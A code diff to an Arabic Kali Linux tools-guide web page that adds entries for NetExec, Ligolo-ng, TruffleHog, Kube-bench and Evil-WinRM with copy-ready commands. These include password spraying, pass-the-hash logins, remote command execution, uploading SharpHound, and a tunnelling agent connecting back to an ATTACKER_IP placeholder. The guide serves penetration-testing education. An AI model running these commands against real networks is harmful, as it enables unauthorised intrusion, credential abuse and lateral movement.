@@ -9,7 +9,7 @@
 <meta name="keywords" content="أدوات Kali Linux, أدوات الاختراق, Nmap, Metasploit, Burp Suite, Wireshark, أدوات أمن سيبراني">
 <meta name="author" content="Kali Academy">
 <meta name="robots" content="index, follow, max-image-preview:large">
-<meta property="og:title" content="دليل أدوات Kali Linux - KaliAcademy | 100+ أداة">
+<meta property="og:title" content="دليل أدوات Kali Linux - KaliAcademy | أدوات أمن سيبراني عملية">
 <meta property="og:description" content="دليل شامل لأدوات الأمن السيبراني وKali Linux بشرح عربي عملي وأوامر جاهزة">
 <meta property="og:image" content="https://kali-academy.github.io/images/logo-brand.svg">
 <meta property="og:image:alt" content="Kali Academy Tools Guide">
@@ -18,7 +18,7 @@
 <meta property="og:locale" content="ar_AR">
 <meta property="og:site_name" content="Kali Academy">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="دليل الأدوات - KaliAcademy | 100+ أداة أمن سيبراني">
+<meta name="twitter:title" content="دليل الأدوات - KaliAcademy | أدوات أمن سيبراني عملية أمن سيبراني">
 <meta name="twitter:description" content="استعرض أدوات Kali Linux بشرح عربي عملي وأوامر جاهزة للنسخ">
 <meta name="twitter:image" content="https://kali-academy.github.io/images/logo-brand.svg">
 <link rel="icon" type="image/svg+xml" href="images/logo-brand.svg">
@@ -2470,6 +2470,110 @@ const TOOLS = [
   tips: ['💡 msfdb start قبل msfconsole لنتائج منظمة', '⚠️ استخدمه فقط على أنظمة مرخّص باختبارها'],
   related: ['Armitage', 'Cobalt Strike', 'Empire'],
 },
+
+{
+  id: 1001,
+  name: 'NetExec (nxc)',
+  icon: '🧠',
+  color: 'linear-gradient(135deg,#20c997,#0dcaf0)',
+  short: 'استغلال وإدارة بيئات Active Directory الحديثة',
+  cat: 'network',
+  tags: ['network','recon','privesc'],
+  desc: `NetExec (البديل الحديث لـ CrackMapExec) أداة قوية لاختبار أمن شبكات Windows وActive Directory. تدعم SMB/WinRM/LDAP وتساعدك في التحقق من كلمات المرور، جمع معلومات الدومين، وتنفيذ أوامر عن بُعد في اختبارات الاختراق الداخلية.`,
+  features: ['SMB وWinRM Enumeration', 'Password Spraying آمن', 'Session Validation', 'تحليل Shares وGroups', 'Workflow سريع لبيئات AD'],
+  install: 'pipx install git+https://github.com/Pennyw0rth/NetExec\n# بديل:\npip3 install netexec',
+  version: 'nxc --version',
+  commands: [
+    { cmd: 'nxc smb 192.168.1.0/24', note: 'اكتشاف أجهزة SMB وإصدار النظام' },
+    { cmd: 'nxc smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success', note: 'Password spraying مع متابعة النتائج' },
+    { cmd: 'nxc smb 192.168.1.10 -u admin -p Pass123! --shares', note: 'جرد المشاركات الشبكية' },
+    { cmd: 'nxc winrm 192.168.1.10 -u admin -p Pass123! -x "whoami"', note: 'تنفيذ أمر عبر WinRM' }
+  ],
+  tips: ['💡 ابدأ دائماً بنطاق اختبار معزول قبل بيئة الإنتاج', '⚠️ راقب سياسات lockout أثناء spraying'],
+  related: ['BloodHound', 'impacket', 'Evil-WinRM'],
+},
+{
+  id: 1002,
+  name: 'Ligolo-ng',
+  icon: '🛰️',
+  color: 'linear-gradient(135deg,#7b61ff,#00d4ff)',
+  short: 'إنشاء نفق Pivoting سريع للانتقال داخل الشبكات',
+  cat: 'network',
+  tags: ['network','exploit','recon'],
+  desc: `Ligolo-ng يوفّر Tunneling/Pivoting عالي الأداء للوصول إلى شبكات داخلية بعد الاختراق الأولي. بدلاً من إعداد VPN معقد، يمنحك قناة سهلة تسمح لأدوات مثل Nmap وRDP بالعمل على الشبكة الداخلية.`,
+  features: ['Pivoting سريع', 'تشغيل على Linux/Windows', 'Multiple Agents', 'دعم Socks وTun', 'مناسب لعمليات Red Team'],
+  install: 'sudo apt install ligolo-ng -y\n# أو تحميل binary من GitHub Releases',
+  version: 'ligolo-proxy --version',
+  commands: [
+    { cmd: 'sudo ligolo-proxy -selfcert', note: 'تشغيل البروكسي على جهاز المهاجم' },
+    { cmd: './agent -connect ATTACKER_IP:11601 -ignore-cert', note: 'ربط Agent من الجهاز المخترق' },
+    { cmd: 'interface_create --name ligolo\ninterface_start --name ligolo', note: 'إنشاء وتشغيل واجهة tunnel' },
+    { cmd: 'route_add --name ligolo --route 10.10.20.0/24', note: 'توجيه شبكة داخلية عبر النفق' }
+  ],
+  tips: ['💡 استخدمه عند الوصول لجهاز foothold وتحتاج حركة جانبية', '⚠️ احذف أي route بعد انتهاء التقييم'],
+  related: ['Chisel', 'Proxychains', 'Metasploit'],
+},
+{
+  id: 1003,
+  name: 'TruffleHog',
+  icon: '🔑',
+  color: 'linear-gradient(135deg,#ff7b00,#ff3d71)',
+  short: 'اكتشاف المفاتيح والتوكنات المسربة في Git وملفات السحابة',
+  cat: 'recon',
+  tags: ['recon','forensics','cloud'],
+  desc: `TruffleHog يبحث عن Secrets المسربة مثل API keys وtokens وكلمات المرور داخل Git repositories وS3 وغيرها. أداة أساسية لأي فريق AppSec وBug Bounty لاكتشاف التسريبات قبل استغلالها.`,
+  features: ['فحص Git history بالكامل', 'دعم GitHub/GitLab', 'كواشف عالية الدقة', 'نتائج JSON سهلة التكامل', 'كشف التسريبات السحابية'],
+  install: 'brew install trufflehog\n# Linux:\nsudo snap install trufflehog',
+  version: 'trufflehog --version',
+  commands: [
+    { cmd: 'trufflehog git https://github.com/target/repo.git', note: 'فحص مستودع Git كامل' },
+    { cmd: 'trufflehog filesystem ./project --json > leaks.json', note: 'فحص مشروع محلي وحفظ النتائج' },
+    { cmd: 'trufflehog github --org target-org --token ghp_xxx', note: 'مسح جميع مستودعات المنظمة' }
+  ],
+  tips: ['💡 اربط النتائج مع rotation policy للمفاتيح', '⚠️ لا تعرض المفاتيح الحقيقية في التقارير العامة'],
+  related: ['Gitleaks', 'GitGuardian', 'Semgrep'],
+},
+{
+  id: 1004,
+  name: 'Kube-bench',
+  icon: '☸️',
+  color: 'linear-gradient(135deg,#00a3ff,#0052cc)',
+  short: 'تدقيق أمن Kubernetes وفق معايير CIS',
+  cat: 'forensics',
+  tags: ['forensics','network','linux'],
+  desc: `Kube-bench أداة مهمة لتقييم أمن Kubernetes عبر فحص إعدادات العقد وControl Plane ومقارنتها بمعيار CIS Benchmark. تستخدم بكثرة في أمن السحابة وعمليات DevSecOps.`,
+  features: ['CIS Benchmark Checks', 'تقارير واضحة بالأقسام', 'دعم multi-node', 'تكامل مع CI/CD', 'مفيد لفِرق Cloud Security'],
+  install: 'curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_$(uname -s)_$(uname -m).tar.gz -o kube-bench.tgz\ntar -xzf kube-bench.tgz',
+  version: './kube-bench --version',
+  commands: [
+    { cmd: 'kubectl get nodes -o wide', note: 'التأكد من العقد المستهدفة' },
+    { cmd: 'sudo ./kube-bench run --targets master,node,etcd', note: 'تشغيل تدقيق شامل' },
+    { cmd: 'sudo ./kube-bench run --json > kube-bench-report.json', note: 'تقرير JSON للتحليل' }
+  ],
+  tips: ['💡 عالج High findings أولاً ثم Medium', '⚠️ نفّذ الفحص خارج وقت الذروة في الإنتاج'],
+  related: ['kube-hunter', 'Trivy', 'Falco'],
+},
+{
+  id: 1005,
+  name: 'Evil-WinRM',
+  icon: '🪟',
+  color: 'linear-gradient(135deg,#9d4edd,#3a86ff)',
+  short: 'إدارة جلسات Windows post-exploitation عبر WinRM',
+  cat: 'privesc',
+  tags: ['privesc','network','exploit'],
+  desc: `Evil-WinRM Shell متقدم للوصول لأنظمة Windows عبر WinRM في بيئات اختبار الاختراق الداخلية. يساعد في تنفيذ الأوامر، رفع الملفات، واستخدام PowerShell بشكل احترافي بعد الحصول على بيانات اعتماد صحيحة.`,
+  features: ['Remote PowerShell', 'File Upload/Download', 'Pass-the-Hash Support', 'Tab Completion', 'عمليات Post-Exploitation فعالة'],
+  install: 'sudo gem install evil-winrm\n# بديل عبر apt إذا متوفر: sudo apt install evil-winrm -y',
+  version: 'evil-winrm --version',
+  commands: [
+    { cmd: 'evil-winrm -i 192.168.1.10 -u administrator -p "Pass123!"', note: 'الدخول عبر WinRM بكلمة مرور' },
+    { cmd: 'evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH', note: 'Pass-the-Hash للوصول' },
+    { cmd: 'upload SharpHound.exe\n./SharpHound.exe -c All', note: 'رفع وتشغيل أدوات جمع AD' }
+  ],
+  tips: ['💡 جرّب -S إذا كان WinRM يعمل على HTTPS', '⚠️ تأكد أن الحساب مصرح له بـ WinRM'],
+  related: ['NetExec', 'BloodHound', 'impacket'],
+},
+
 ]; // END OF TOOLS DATABASE
 
 // ============================================================
@@ -2616,7 +2720,12 @@ function openTool(id) {
     html += `<div class="modal-section">
       <div class="modal-section-title"><i class="fas fa-download"></i> التثبيت</div>
       <div class="install-box">
-        ${t.install.split('\n').map(line => `<div class="install-cmd">${escH(line)}</div>`).join('')}
+        ${t.install.split('\n').map(line => `
+          <div class="modal-cmd">
+            <div style="flex:1;overflow:hidden;min-width:0;"><code>${escH(line)}</code></div>
+            <button class="copy-modal-btn" onclick="copyCmd('${escJ(line)}',this)">نسخ</button>
+          </div>
+        `).join('')}
       </div>
     </div>`;
   }
